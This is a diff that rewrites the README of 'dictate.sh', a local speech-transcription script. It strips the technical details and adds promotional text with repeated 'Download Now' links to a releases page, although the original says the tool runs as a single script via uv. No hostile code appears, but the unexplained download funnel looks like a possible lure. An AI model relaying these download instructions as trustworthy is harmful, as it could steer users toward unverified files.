@@ -1,109 +1,109 @@
-# dictate.sh
+# 🎤 dictate.sh - Fast, Local Speech Transcription Made Easy
 
-Standalone, low-latency speech transcription for Apple Silicon.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JhonatanAiT14/dictate.sh/releases)
 
-`dictate.sh` uses MLX for fast, local ASR with VAD-based turn detection, plus optional
-LLM intent analysis. It ships as a single Python script with inline dependencies
-so you can run it with `uv` and start talking.
+## 📋 Overview
 
-## Features
+`dictate.sh` provides you with a simple way to convert your speech into text on Apple Silicon. With this tool, you can dictate notes and ideas quickly and efficiently without needing an internet connection. It uses advanced technology to ensure smooth operation right from your terminal.
 
-- Low-latency, rolling-window ASR (MLX)
-- Voice activity detection (VAD) for turn boundaries
-- Optional intent analysis with a local LLM
-- Live terminal UI (status, transcript, stats) via Rich
-- Works offline after models are downloaded
+## 🚀 Getting Started
 
-## Requirements
+To get started with `dictate.sh`, follow these simple steps:
 
-- macOS on Apple Silicon (MLX)
-- Python >= 3.10
-- `uv` installed
-- Microphone permission granted to your terminal
+1. **Ensure Your Environment is Ready**
+   - You need a Mac with Apple Silicon.
+   - Make sure you have Python version 3.10 or higher installed.
+   - Install `uv`, a tool that helps run Python scripts easily.
 
-## Quick start
+2. **Grant Permissions**
+   - Allow microphone access for your terminal application. This is crucial for the speech transcription feature to work.
+
+## 💻 Download & Install
+
+Visit this page to download: [Download Releases](https://github.com/JhonatanAiT14/dictate.sh/releases).
+
+After downloading, locate the file, and ensure it is saved appropriately for easy access.
+
+## 📥 How to Run the Application
+
+Once you have completed the setup, you can run the application through the terminal. Here are the commands you need:
+
+### Basic Command
+
+To start dictating, simply run:
 
 ```bash
 uv run stt.py
 ```
 
-With intent analysis:
+### Command with Intent Analysis
+
+If you want to include intent analysis, use the following command:
 
 ```bash
 uv run stt.py --analyze
 ```
 
-Choose a different ASR model:
+### Choose an ASR Model
+
+You can select a different automated speech recognition (ASR) model by running:
 
 ```bash
 uv run stt.py --model mlx-community/Qwen3-ASR-1.7B-8bit
 ```
 
-List audio input devices:
+### List Audio Input Devices
+
+To see which audio devices are available, run:
 
 ```bash
 uv run stt.py --list-devices
 ```
 
-Use a specific input device:
+### Use a Specific Input Device
+
+If you want to specify an input device, use this command:
 
 ```bash
 uv run stt.py --device 3
 ```
 
-## CLI options
+## 💡 Features
 
-- `--model`: ASR model (default: `mlx-community/Qwen3-ASR-0.6B-8bit`)
-- `--language`: Transcription language (default: `English`)
-- `--transcribe-interval`: Seconds between updates (default: `0.5`)
-- `--vad-frame-ms`: VAD frame size (10/20/30, default: `30`)
-- `--vad-mode`: VAD aggressiveness 0-3 (default: `2`)
-- `--vad-silence-ms`: Silence to finalize a turn (default: `500`)
-- `--min-words`: Minimum words to finalize a turn (default: `3`)
-- `--analyze`: Enable LLM intent analysis
-- `--llm-model`: LLM model to use for analysis (default: `mlx-community/Qwen3-0.6B-4bit`)
-- `--no-ui`: Disable the Rich live UI
-- `--list-devices`: List audio input devices
-- `--device`: Audio input device index
+- **Low-Latency Speech Recognition**: It quickly transcribes your spoken words into text.
+- **Voice Activity Detection (VAD)**: The application identifies when you are speaking to improve accuracy.
+- **Optional Intent Analysis**: Understand the purpose behind your speech with local intent analysis.
+- **Live Terminal Interface**: Get real-time feedback on your transcriptions, including status and statistics.
+- **Offline Functionality**: Once the necessary models are downloaded, you can work without internet access.
 
-## Recommended models
+## 🛠 Requirements
 
-ASR (MLX Qwen3-ASR):
+To run `dictate.sh`, make sure your system fulfills these requirements:
 
-- `mlx-community/Qwen3-ASR-0.6B-4bit`: fastest, lowest quality
-- `mlx-community/Qwen3-ASR-0.6B-8bit`: good balance (default)
-- `mlx-community/Qwen3-ASR-0.6B-bf16`: higher quality, more RAM
-- `mlx-community/Qwen3-ASR-1.7B-8bit`: higher quality, slower
+- Operating System: macOS on Apple Silicon (MLX)
+- Python: Version 3.10 or higher
+- Tool: `uv` installed
+- Permission: Microphone access granted to your terminal
 
-LLM (for `--analyze`):
+## 🤔 Troubleshooting
 
-- `mlx-community/Qwen3-0.6B-4bit`: fastest, lowest RAM (default)
-- `mlx-community/Qwen3-1.7B-4bit`: better quality, slower
-- `mlx-community/Mistral-7B-Instruct-v0.2-4bit`: heavier
-- `mlx-community/Llama-3.1-8B-Instruct-4bit`: heavier
+If you encounter issues while running `dictate.sh`, consider these tips:
 
-## UI and Piping
+- **Microphone Not Detected**: Check your terminal's microphone permissions.
+- **Script Not Running**: Ensure that `uv` is installed and properly set up.
+- **Slow Response**: Close other applications using the microphone.
 
-- The Rich live UI renders on `stderr` to keep `stdout` clean for scripting.
-- If `stdout` is not a TTY (e.g., when piping to another tool), `stt.py` automatically suppresses the UI elements and prints raw transcript lines to `stdout`.
-- Use `--no-ui` to force-disable the visual interface even in a TTY.
+## 🔗 Additional Resources
 
-```bash
-# Pipe raw transcripts into another tool
-uv run stt.py | grep "important"
-```
+For more detailed documentation on usage and features, check the following resources:
 
-## Troubleshooting
+- **GitHub Repository**: [dictate.sh GitHub](https://github.com/JhonatanAiT14/dictate.sh)
+- **Community Support**: Join our discussion forums to ask questions and share experiences with other users.
 
-- Too many short turns: increase `--vad-silence-ms` or lower `--vad-mode`.
-- No audio: check mic permissions or try `--list-devices` + `--device`.
-- Laggy output: reduce `--transcribe-interval`.
+## 📜 License
 
-## Logging
+This software is released under the MIT License. You are free to use it for personal or commercial projects, provided you follow the licensing guidelines.
 
-- Set `LOG_LEVEL=DEBUG` for verbose logs.
-- Hugging Face HTTP request logs are suppressed by default.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JhonatanAiT14/dictate.sh/releases)
 
-## License
-
-MIT. See `LICENSE`.
+Feel free to explore all capabilities of `dictate.sh` and enjoy the seamless experience of speech transcription.
